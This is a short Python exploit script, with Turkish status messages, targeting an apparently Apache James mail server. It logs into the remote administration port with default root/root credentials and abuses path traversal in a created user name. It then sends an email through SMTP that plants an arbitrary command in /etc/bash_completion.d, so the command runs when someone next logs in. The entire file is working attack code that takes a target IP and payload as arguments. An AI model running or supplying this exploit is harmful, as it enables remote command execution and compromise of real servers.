import socket
import sys
import time
import re
from colorama import Fore


# payload = 'touch /root/proof.txt'
#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
user = 'root'
pwd = 'root'
# example: python <filename>.py <ip> <cmd>
if len(sys.argv) != 3:
    sys.exit(1)

ip = sys.argv[1]
payload = str(sys.argv[2])
def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print(Fore.BLUE+"[i]"+Fore.RESET+" James Uzaktan Yönetim Aracına Bağlanma...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print(Fore.BLUE+"[i]"+Fore.RESET+" Kullanıcı Oluşturma ...")
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()
    print(Fore.BLUE+"[i]"+Fore.RESET+" James SMTP sunucusuna bağlanma ...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print(Fore.BLUE+"[i]"+Fore.RESET+" Payload gönderme...")
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n")
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: blestboyz@BLESTBOYZ.pl\r\n")
    # s.send("YOU ARE HACKED!")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print(Fore.YELLOW+"[+]"+Fore.RESET+" Tamamlandı! Birisi giriş yaptıktan sonra Payload/Komut yürütülecek.")
except:
    print(Fore.RED+"[-]"+Fore.RESET+" Bağlantı başarısız oldu.")
